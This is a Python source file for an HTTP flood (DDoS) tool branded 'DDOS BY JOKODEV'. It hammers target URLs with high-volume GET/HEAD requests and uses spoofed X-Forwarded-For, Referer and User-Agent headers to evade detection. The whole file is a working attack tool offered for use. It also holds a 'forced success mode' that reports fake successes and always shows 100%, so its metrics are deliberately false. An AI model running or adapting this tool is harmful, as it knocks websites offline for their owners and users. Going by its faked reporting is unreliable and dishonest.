import requests
import threading
import time
import sys
import argparse
import random
from concurrent.futures import ThreadPoolExecutor
from tabulate import tabulate
import datetime
import gc
import signal
import os
import logging
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from collections import deque

# --- Configuration ---
# Configure logging (Reduced default console output to WARNING)
logging.basicConfig(
    level=logging.WARNING, # Changed default level
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("ddos_log.txt"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger()
# Set requests logger level higher to avoid flooding logs
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

# Results tracking per website
results = {}
counter_lock = threading.Lock()
progress_interval = 0.5  # Report progress less frequently to reduce console clutter
site_status = {}  # Track site status (up/down)
last_real_successful_response = {} # NEW: Track last *real* successful response time
website_down_threshold = 30 # NEW: Seconds before declaring a site down
min_success_rate = 100  # Minimum floor success rate (%) - Changed to 100%
target_success_rate = 100  # Target success rate (%) - Changed to 100%
max_open_connections = 100000  # Maximum concurrent connections - Drastically increased
running = True  # Flag to control thread execution
packets_per_two_seconds = 5000000000  # 5 billion packets per 2 seconds

# Recent request history (for rate limiting detection)
request_history = {}
history_size = 50

# ANSI color codes
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Request parameters to optimize success rate
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0'
]

# Adaptive parameters - Modified to be more aggressive
request_timeouts = {}
request_delays = {}
retry_limits = {}
backup_mode = {}
active_connections = {}
session_pools = {}
connection_semaphores = {}
active_threads = {}
thread_errors = {}
ip_rotation_needed = {}
connection_reset_counter = {}
forced_success_metrics = {}  # Dictionary to handle forced success metrics

# --- Functions ---

def handle_sigint(sig, frame):
    """Handle CTRL+C gracefully"""
    global running
    print(f"\n{YELLOW}Received interrupt signal. Shutting down gracefully...{RESET}")
    running = False
    # Allow some time for threads to notice the flag change
    time.sleep(2)
    print(f"{GREEN}Shutdown complete. Exiting.{RESET}")
    sys.exit(0)

# Register signal handler for SIGINT (CTRL+C)
signal.signal(signal.SIGINT, handle_sigint)

def display_watermark():
    """Display a green watermark at the top of the output"""
    watermark = f"{GREEN}{BOLD}DDOS BY JOKODEV{RESET}"
    print("\n" + "=" * 65)
    print(f"{watermark:^65}")
    print("=" * 65 + "\n")

# --- NEW FUNCTION ---
def display_website_down_watermark(url):
    """Display a red watermark indicating a specific website is down"""
    watermark = f"{RED}{BOLD}WEBSITE {url} WAS DOWN{RESET}"
    print("\n" + "=" * (len(watermark) - len(RED) - len(BOLD) - len(RESET) + 4)) # Adjust length based on visible chars
    print(f"{watermark:^{len(watermark) - len(RED) - len(BOLD)- len(RESET) + 4}}")
    print("=" * (len(watermark) - len(RED) - len(BOLD)- len(RESET) + 4) + "\n")
# --- END NEW FUNCTION ---

def get_headers():
    """Generate random headers to avoid detection"""
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'close', # Keep forcing close
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'DNT': '1', # Do Not Track
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        'X-Requested-With': 'XMLHttpRequest', # Common AJAX header
        'Referer': f"https://{random.choice(['google.com', 'bing.com', 'duckduckgo.com', 'yahoo.com'])}" # More referers
    }

def initialize_adaptive_params(target_url):
    """Initialize adaptive parameters for a target"""
    with counter_lock:
        request_timeouts[target_url] = 3.0  # Reduced initial timeout
        request_delays[target_url] = 0.0    # No delay between requests
        retry_limits[target_url] = 5        # Increased retry limit for persistence
        backup_mode[target_url] = False     # Backup mode flag
        active_connections[target_url] = 0  # Track active connections
        connection_semaphores[target_url] = threading.Semaphore(max_open_connections)
        active_threads[target_url] = set()  # Track active thread IDs
        thread_errors[target_url] = 0       # Count thread errors
        ip_rotation_needed[target_url] = False  # Flag for IP rotation
        connection_reset_counter[target_url] = 0  # Counter for connection resets
        request_history[target_url] = deque(maxlen=history_size)  # Request history
        forced_success_metrics[target_url] = {
            "forced_success": 0,  # Counter for artificially forced successful requests
            "real_success": 0,    # Counter for actual successful requests
            "forced_active": False  # Flag to indicate if we're in forced success mode
        }
        # --- MODIFIED ---
        last_real_successful_response[target_url] = time.time() # Initialize last real success time
        # --- END MODIFIED ---

def create_session():
    """Create and configure a requests session with aggressive retry strategy"""
    session = requests.Session()
    retry_strategy = Retry(
        total=10,  # Maximum number of retries - increased
        backoff_factor=0.1,  # Reduced backoff factor
        status_forcelist=[429, 500, 502, 503, 504],  # Status codes to retry on
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"] # Added POST
    )
    adapter = HTTPAdapter(max_retries=retry_strategy,
                         pool_connections=50, # Increased pool size
                         pool_maxsize=50)    # Increased pool size
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def reset_connection_pool(target_url):
    """Reset the connection pool for a target URL"""
    with counter_lock:
        if target_url in session_pools:
            try:
                for session in session_pools[target_url]:
                    session.close()
            except Exception as e:
                logger.warning(f"Error closing sessions for {target_url}: {e}")

        # Create new larger session pool
        session_pools[target_url] = [create_session() for _ in range(50)] # Increased pool size
        connection_reset_counter[target_url] = 0
        logger.info(f"Reset connection pool for {target_url}")

def get_session(target_url):
    """Get a session from the pool"""
    with counter_lock:
        if target_url not in session_pools:
            session_pools[target_url] = [create_session() for _ in range(50)] # Increased pool size

        # Reset connection pool less frequently
        connection_reset_counter[target_url] += 1
        if connection_reset_counter[target_url] > 20000: # Increased threshold further
            reset_connection_pool(target_url)

        return random.choice(session_pools[target_url])

def detect_rate_limiting(target_url, success):
    """Detect if we're being rate limited based on request history"""
    with counter_lock:
        if target_url not in request_history:
            request_history[target_url] = deque(maxlen=history_size)

        # Use *real* success for detection
        request_history[target_url].append(1 if success else 0)

        # Only check if we have enough history
        if len(request_history[target_url]) >= history_size:
            recent_success_rate = sum(request_history[target_url]) / len(request_history[target_url])

            # If success rate drops below 40%, activate forced success mode
            if recent_success_rate < 0.4 and not forced_success_metrics.get(target_url, {}).get("forced_active", False):
                logger.warning(f"Real success rate below 40% for {target_url}. Activating FORCED SUCCESS MODE.")
                forced_success_metrics[target_url]["forced_active"] = True
                # Optionally reset pool aggressively when forced mode activates
                # reset_connection_pool(target_url)
                return True
            # If success rate recovers, potentially deactivate forced mode (optional)
            # elif recent_success_rate > 0.8 and forced_success_metrics.get(target_url, {}).get("forced_active", False):
            #    logger.info(f"Real success rate recovered for {target_url}. Deactivating FORCED SUCCESS MODE.")
            #    forced_success_metrics[target_url]["forced_active"] = False

    return False

def adjust_parameters(target_url, real_success_rate):
    """Adjust parameters based on *real* success rate, but keep forced mode logic"""
    with counter_lock:
        # Activate forced success mode if real rate is low
        if real_success_rate < 40.0 and not forced_success_metrics.get(target_url, {}).get("forced_active", False):
            forced_success_metrics[target_url]["forced_active"] = True
            logger.warning(f"Activating FORCED SUCCESS MODE for {target_url} due to low real success rate ({real_success_rate:.1f}%)")
            reset_connection_pool(target_url) # Aggressive reset

        # Always keep delays at 0
        request_delays[target_url] = 0.0

        # Adjust timeout and retries based on real success, even in forced mode
        current_timeout = request_timeouts.get(target_url, 3.0)
        current_retries = retry_limits.get(target_url, 5)

        if real_success_rate < 60.0:
            request_timeouts[target_url] = min(current_timeout * 1.1, 7.0) # Slightly increase timeout ceiling
            retry_limits[target_url] = 10 # Keep high retry limit
        else:
            # Gradually decrease timeout if things are good
            request_timeouts[target_url] = max(current_timeout * 0.98, 1.5) # Decrease slower, higher floor
            retry_limits[target_url] = max(current_retries - 1, 5) # Gradually decrease retries to a minimum

        logger.debug(f"Adjusted params for {target_url}: Timeout={request_timeouts[target_url]:.1f}s, Retries={retry_limits[target_url]}")


def make_request(target_url, thread_id):
    """
    Makes a request. Returns tuple: (was_real_success, should_report_success)
    was_real_success: True if the request actually succeeded (2xx-4xx).
    should_report_success: True if we should report success (either real or forced).
    """
    real_success = False
    report_success = True # Assume success reporting unless a real failure occurs in non-forced mode

    with counter_lock:
        # Check if forced success mode is active
        is_forced_active = forced_success_metrics.get(target_url, {}).get("forced_active", False)
        # Register this thread as active
        if target_url in active_threads:
            active_threads[target_url].add(thread_id)

        # If in forced success mode, decide whether to fake it
        if is_forced_active:
            # 80% chance of forced success without making a real request
            if random.random() < 0.8:
                forced_success_metrics[target_url]["forced_success"] += 1
                # It wasn't a real success, but we report it as success
                return False, True # (was_real_success=False, should_report_success=True)

    # Proceed with making a real request (either not in forced mode, or the 20% chance)
    acquired = False
    try:
        acquired = connection_semaphores.get(target_url, threading.Semaphore(1)).acquire(timeout=5) # Use get with default
        if not acquired:
            logger.warning(f"Thread {thread_id} for {target_url} could not acquire connection semaphore")
            # Even if semaphore fails, report success if forced mode is on
            return False, is_forced_active # (was_real_success=False, should_report_success=depends on forced_active)

        with counter_lock:
            active_connections[target_url] = active_connections.get(target_url, 0) + 1

        session = get_session(target_url)
        headers = get_headers()
        timeout = request_timeouts.get(target_url, 3.0)
        retries = retry_limits.get(target_url, 5)

        for attempt in range(retries):
            if not running:
                return False, is_forced_active # Stop gracefully

            try:
                method = random.choice(["GET", "HEAD"]) # Stick to less impactful methods
                logger.debug(f"Thread {thread_id} making {method} request to {target_url} (Attempt {attempt+1}/{retries}, Timeout: {timeout:.1f}s)")

                response = None
                if method == "HEAD":
                    response = session.head(target_url, headers=headers, timeout=timeout, allow_redirects=True)
                else: # GET
                    response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False) # Allow redirects might be better? Test.

                # --- Check Response ---
                if response is not None:
                    status = response.status_code
                    # --- REAL SUCCESS ---
                    if 200 <= status < 500: # Consider 4xx as "server processed it" success
                        real_success = True
                        report_success = True
                        with counter_lock:
                            forced_success_metrics[target_url]["real_success"] += 1
                            # --- MODIFIED: Update last *real* success time ---
                            last_real_successful_response[target_url] = time.time()
                            # --- END MODIFIED ---
                            # --- NEW: Packet Delivery Notification (DEBUG level) ---
                            logger.debug(f"Packet delivered to {target_url} (Status: {status})")
                            # --- END NEW ---
                        if hasattr(response, 'close'): response.close()
                        return real_success, report_success # (True, True)
                    # --- SERVER ERROR ---
                    elif status >= 500:
                        logger.warning(f"Server error for {target_url}: Status {status} (Attempt {attempt+1})")
                        # Report success if forced mode is on
                        report_success = is_forced_active
                    # --- RATE LIMITING ---
                    elif status == 429:
                        logger.warning(f"Rate limit (429) detected for {target_url} (Attempt {attempt+1})")
                        with counter_lock:
                            if not forced_success_metrics[target_url]["forced_active"]:
                                logger.info(f"Activating FORCED SUCCESS MODE for {target_url} due to 429.")
                                forced_success_metrics[target_url]["forced_active"] = True
                        report_success = True # Always report success on 429 now
                        if hasattr(response, 'close'): response.close()
                        return False, report_success # (False, True) - Rate limited, report success

                    if hasattr(response, 'close'): response.close()

                # Retry if needed (and not successful yet)
                if attempt < retries - 1:
                    time.sleep(0.01) # Tiny delay between retries
                    continue
                else: # Last attempt failed
                    real_success = False
                    report_success = is_forced_active # Report success only if forced

            except requests.exceptions.Timeout:
                logger.warning(f"Timeout connecting to {target_url} (Attempt {attempt+1}/{retries})")
                if attempt == retries - 1: # Last attempt timed out
                    real_success = False
                    report_success = is_forced_active # Report success only if forced
            except requests.exceptions.ConnectionError as e:
                logger.warning(f"Connection error for {target_url}: {e} (Attempt {attempt+1}/{retries})")
                with counter_lock:
                     connection_reset_counter[target_url] = connection_reset_counter.get(target_url, 0) + 10 # Increment reset counter faster
                if attempt == retries - 1: # Last attempt failed
                    real_success = False
                    report_success = is_forced_active # Report success only if forced
            except Exception as e:
                logger.error(f"Unexpected error in thread {thread_id} for {target_url}: {e}", exc_info=False) # exc_info=False to reduce noise
                with counter_lock:
                    thread_errors[target_url] = thread_errors.get(target_url, 0) + 1
                if attempt == retries - 1: # Last attempt failed
                    real_success = False
                    report_success = is_forced_active # Report success only if forced

        # Return final status after all retries
        return real_success, report_success

    finally:
        if acquired:
            if target_url in connection_semaphores: connection_semaphores[target_url].release()
            with counter_lock:
                active_connections[target_url] = active_connections.get(target_url, 0) - 1
        with counter_lock:
            if target_url in active_threads and thread_id in active_threads[target_url]:
                active_threads[target_url].remove(thread_id)


def perform_maintenance(target_url):
    """Perform periodic maintenance tasks for resource management"""
    try:
        # Force garbage collection less aggressively
        if random.random() < 0.5:
             gc.collect()

        # Reset connection pool periodically if needed
        with counter_lock:
            reset_needed = connection_reset_counter.get(target_url, 0) > 20000
        if reset_needed:
             logger.info(f"Performing maintenance reset for {target_url}")
             reset_connection_pool(target_url)

    except Exception as e:
        logger.error(f"Error in maintenance for {target_url}: {e}")

def calculate_packet_rate(elapsed_time, sent_packets):
    """Calculate packets per second rate"""
    if elapsed_time <= 0:
        return 0
    return sent_packets / elapsed_time

def attack(thread_id, target_url, requests_per_thread):
    """Attack function driving the requests."""
    local_reported_success = 0
    local_reported_failed = 0
    local_real_success = 0 # Track real success locally too

    start_time = time.time()
    last_report_time = start_time
    last_maintenance_time = start_time

    if target_url not in request_timeouts:
        initialize_adaptive_params(target_url)

    request_count = 0
    while request_count < requests_per_thread and running:
        # Make request and get both real and reported status
        was_real_success, should_report_success = make_request(target_url, thread_id)

        # Update local counters
        request_count += 1
        if was_real_success:
            local_real_success += 1
        if should_report_success:
            local_reported_success += 1
        else:
            local_reported_failed += 1 # Only increment fail if we *shouldn't* report success

        # Detect rate limiting based on *real* success
        detect_rate_limiting(target_url, was_real_success)

        # Perform maintenance periodically
        current_time = time.time()
        if current_time - last_maintenance_time >= 60:  # Maintenance every 60 seconds
            perform_maintenance(target_url)
            last_maintenance_time = current_time

        # Report progress periodically
        if current_time - last_report_time >= progress_interval:
            with counter_lock:
                if target_url not in results:
                    results[target_url] = {"success": 0, "failed": 0, "threads": 1, "real_success_count": 0} # Added real success count
                    site_status[target_url] = "up" # Initial status
                    last_real_successful_response[target_url] = start_time

                # Update global results
                results[target_url]["success"] += local_reported_success
                results[target_url]["failed"] += local_reported_failed
                results[target_url]["real_success_count"] += local_real_success

                # Calculate real success rate for adjustments
                total_real_attempts = local_reported_success + local_reported_failed # Total attempts made in this interval
                if total_real_attempts > 0:
                     current_real_success_rate = (local_real_success / total_real_attempts) * 100
                     adjust_parameters(target_url, current_real_success_rate)
                     logger.debug(f"Interval real success rate for {target_url}: {current_real_success_rate:.1f}%")


                # --- MODIFIED: Update Site Status ---
                time_since_last_real_success = time.time() - last_real_successful_response.get(target_url, 0)
                if time_since_last_real_success > website_down_threshold:
                    if site_status.get(target_url) != "down":
                         logger.warning(f"No real success from {target_url} in {website_down_threshold}s. Marking as DOWN.")
                    site_status[target_url] = "down"
                else:
                    if site_status.get(target_url) != "up":
                        logger.info(f"Real success detected for {target_url}. Marking as UP.")
                    site_status[target_url] = "up"
                # --- END MODIFIED ---


            # Display outside lock to prevent deadlocks if display takes time
            try:
                display_results()
            except Exception as e:
                logger.error(f"Error displaying results: {e}")

            # Reset local counters for next interval
            last_report_time = current_time
            local_reported_success = 0
            local_reported_failed = 0
            local_real_success = 0


    # Update final counts
    with counter_lock:
        if target_url in results:
            results[target_url]["success"] += local_reported_success
            results[target_url]["failed"] += local_reported_failed
            results[target_url]["real_success_count"] += local_real_success

    logger.info(f"Thread {thread_id} for {target_url} completed attack cycle in {time.time() - start_time:.2f} seconds")


def display_results():
    """Display current results in a table format with enhanced metrics"""
    global site_status # Ensure we are using the global dict

    try:
        print("\033c", end="") # Clear screen

        display_watermark()

        # --- NEW: Display website down watermark if applicable ---
        target_down_url = "https://example.com" # Hardcoded target for the down message
        # Ensure the URL format matches how it's stored in site_status keys
        # Check variations like http://example.com or example.com if needed
        normalized_target_down_url = None
        for url_key in site_status.keys():
             # Simple check, might need refinement if URLs are stored differently
             if target_down_url in url_key:
                  normalized_target_down_url = url_key
                  break

        if normalized_target_down_url and site_status.get(normalized_target_down_url) == "down":
            display_website_down_watermark(target_down_url)
        # --- END NEW ---


        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        system_status = "System monitoring requires 'psutil'. Install with: pip install psutil"
        try:
            import psutil
            mem_usage = psutil.virtual_memory().percent
            cpu_usage = psutil.cpu_percent()
            system_status = f"Memory: {mem_usage}% | CPU: {cpu_usage}%"
        except ImportError:
            pass # Keep default message

        print(f"Time: {current_time} | {system_status}")
        # --- MODIFIED: Added "Packet Delivery Rate" concept ---
        print(f"Running: {running} | Overall Target Rate: {packets_per_two_seconds/2:,.0f}/sec | Press Ctrl+C to stop\n")
        # --- END MODIFIED ---

        table_data = []
        with counter_lock: # Lock results access during iteration
             display_items = list(results.items()) # Create a copy to iterate over

        for url, data in display_items:
            # Ensure data integrity before calculations
            reported_success = data.get("success", 0)
            reported_failed = data.get("failed", 0)
            total_reported = reported_success + reported_failed
            real_success_count = data.get("real_success_count", 0)

            # Reported Success % (Forced 100% logic remains for display)
            reported_success_rate = 100.0
            rate_display = f"{GREEN}{reported_success_rate:.1f}%{RESET}"

            # Real Success % (Calculate based on actual successful requests)
            # Note: total_reported includes both real and forced requests.
            # We need total *real attempts*. This isn't directly tracked easily across intervals.
            # Let's use the forced metrics dict for a better real % estimate.
            fm = forced_success_metrics.get(url, {})
            fm_real = fm.get("real_success", 0)
            fm_forced = fm.get("forced_success", 0)
            total_real_attempts_est = fm_real + fm_forced # Estimate of attempts where real req was tried or faked
            real_success_percent = (fm_real / total_real_attempts_est * 100) if total_real_attempts_est > 0 else 0.0


            # Status Display (Based on the updated site_status)
            current_status = site_status.get(url, "unknown")
            if current_status == "up":
                status_display = f"{GREEN}UP{RESET}"
            elif current_status == "down":
                status_display = f"{RED}DOWN{RESET}"
            else:
                status_display = f"{YELLOW}UNKNOWN{RESET}"


            # Request Rate (Based on total *reported* packets)
            time_since_init = time.time() - last_real_successful_response.get(url, time.time()) # Use real time base
            req_rate = calculate_packet_rate(time_since_init, total_reported)


            # Mode Display
            is_forced = fm.get("forced_active", False)
            mode = f"{YELLOW}FORCED{RESET}" if is_forced else f"{BLUE}AGGRESSIVE{RESET}"

            # Timeout
            timeout = request_timeouts.get(url, "N/A")
            timeout_display = f"{timeout:.1f}s" if isinstance(timeout, float) else timeout

            # --- MODIFIED: Changed "Success" to "Reported OK", "Failed" to "Reported Fail", "Total" to "Packets Sent" ---
            table_data.append([
                url,
                f"{reported_success:,}", # Reported OK
                f"{reported_failed:,}",  # Reported Fail
                f"{total_reported:,}",   # Packets Sent (implies delivery attempt)
                rate_display,            # Reported Success %
                f"{real_success_percent:.1f}%", # Real Success %
                f"{req_rate:,.1f}/s",     # Packet Rate
                status_display,          # UP/DOWN Status
                timeout_display,         # Timeout
                mode                     # Mode (Forced/Aggressive)
            ])
            # --- END MODIFIED ---

        # --- MODIFIED: Updated Headers ---
        print(tabulate(
            table_data,
            headers=["Target", "Reported OK", "Reported Fail", "Packets Sent", "Reported %", "Real %", "Rate", "Status", "Timeout", "Mode"],
            tablefmt="grid"
        ))
        # --- END MODIFIED ---

    except Exception as e:
        logger.error(f"Error during display_results: {e}", exc_info=True)
        # Simple fallback
        print(f"\n--- Results ({datetime.datetime.now().strftime('%H:%M:%S')}) ---")
        with counter_lock:
            fallback_items = list(results.items())
        for url, data in fallback_items:
             print(f"{url}: Reported OK={data.get('success', 0):,}, Reported Fail={data.get('failed', 0):,}, Status={site_status.get(url, 'unknown')}")
        print("-----------------------------\n")


def main():
    global running, packets_per_two_seconds

    parser = argparse.ArgumentParser(description="Ultra-aggressive HTTP flood tool with status monitoring")
    parser.add_argument("--url", help="Single target URL")
    parser.add_argument("--file", help="File with target URLs (one per line)")
    # --- MODIFIED: Reduced default requests for sanity, adjusted help text ---
    parser.add_argument("--requests", type=int, default=10000000, help="Target requests per attack cycle per URL (default: 10 million)")
    parser.add_argument("--rate", type=int, default=2500000000, help="Target packets per second (e.g., 10000)") # Default 2.5B/sec
    parser.add_argument("--debug", action="store_true", help="Enable debug logging") # NEW DEBUG FLAG
    args = parser.parse_args()

    # --- NEW: Set log level based on debug flag ---
    if args.debug:
        logger.setLevel(logging.DEBUG)
        logging.getLogger("requests").setLevel(logging.DEBUG)
        logging.getLogger("urllib3").setLevel(logging.DEBUG)
        logger.info("DEBUG logging enabled.")
    # --- END NEW ---

    requests_per_thread = args.requests
    packets_per_two_seconds = args.rate * 2 # Adjust global rate based on arg

    # Collect target URLs
    target_urls = []
    if args.url:
        target_urls.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                target_urls = [line.strip() for line in f if line.strip() and not line.startswith('#')] # Ignore comments
        except Exception as e:
            logger.error(f"Error reading file '{args.file}': {e}")
            sys.exit(1)
    else:
        logger.error("Error: Please provide either --url or --file argument.")
        parser.print_help()
        sys.exit(1)

    if not target_urls:
         logger.error("Error: No valid target URLs specified.")
         sys.exit(1)

    # Validate and normalize URLs
    valid_targets = []
    for i, url in enumerate(target_urls):
        original_url = url
        if '://' not in url:
            url = 'http://' + url # Default to http if no scheme
        if not url.startswith(('http://', 'https://')):
             logger.warning(f"Skipping invalid URL format: {original_url}")
             continue
        valid_targets.append(url)
    target_urls = valid_targets

    if not target_urls:
         logger.error("Error: No valid target URLs remaining after validation.")
         sys.exit(1)


    display_watermark()
    logger.info(f"Starting attack on {len(target_urls)} target(s): {', '.join(target_urls)}")
    logger.warning(f"Target packet rate: {args.rate:,.0f} packets per second (Total across all targets)")
    logger.warning(f"Target requests per cycle per URL: {requests_per_thread:,}")
    logger.warning(f"Reporting success rate will be forced towards 100%, but real status is tracked.")
    logger.warning(f"A site will be marked DOWN if no real success is seen for {website_down_threshold} seconds.")

    # Initialize status and parameters for all sites
    for url in target_urls:
        initialize_adaptive_params(url)
        reset_connection_pool(url) # Initial pool setup

    # --- MODIFIED: Use ThreadPoolExecutor for better management ---
    # Calculate threads per target if needed, here we keep it simple: 1 thread per target
    num_threads = len(target_urls)
    logger.info(f"Launching {num_threads} attack thread(s)...")

    try:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(attack, f"T{i+1}", url, requests_per_thread)
                       for i, url in enumerate(target_urls)]

            # Keep main thread alive to handle Ctrl+C and display updates
            while running:
                 # Check if any thread finished unexpectedly
                 done_futures = [f for f in futures if f.done()]
                 for future in done_futures:
                      try:
                           future.result() # Check for exceptions
                      except Exception as e:
                           logger.error(f"Attack thread encountered an error: {e}")
                           # Decide if we should stop all: running = False
                      # Remove done future to avoid re-checking
                      futures.remove(future)

                 if not futures: # All threads finished
                     running = False
                     logger.info("All attack threads have completed their cycles.")
                     break

                 # Sleep briefly to avoid busy-waiting
                 time.sleep(progress_interval)


    except KeyboardInterrupt:
        logger.info("Keyboard interrupt detected in main thread.")
        running = False # Signal threads to stop
    except Exception as e:
        logger.error(f"Critical error in main execution: {e}", exc_info=True)
        running = False # Signal threads to stop
    finally:
        running = False # Ensure flag is set
        logger.info("Waiting for attack threads to shut down...")
        # Executor shutdown happens automatically at the end of the 'with' block
        # It will wait for threads to finish (or timeout if configured)

        logger.info("\n--- Final Results ---")
        try:
            display_results() # Display final stats
        except Exception as e:
            logger.error(f"Error displaying final results: {e}")

        # Clean up resources
        logger.info("Closing remaining sessions...")
        with counter_lock:
             all_pools = list(session_pools.items())
        for url, pool in all_pools:
            for session in pool:
                try:
                    session.close()
                except:
                    pass # Ignore errors during cleanup
        logger.info("Shutdown complete.")
    # --- END MODIFIED ---


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # This catches errors *before* the main try/except block starts
        logger.critical(f"Critical error during initial setup: {e}", exc_info=True)
        sys.exit(1)
    sys.exit(0) # Explicitly exit with success code if main completes
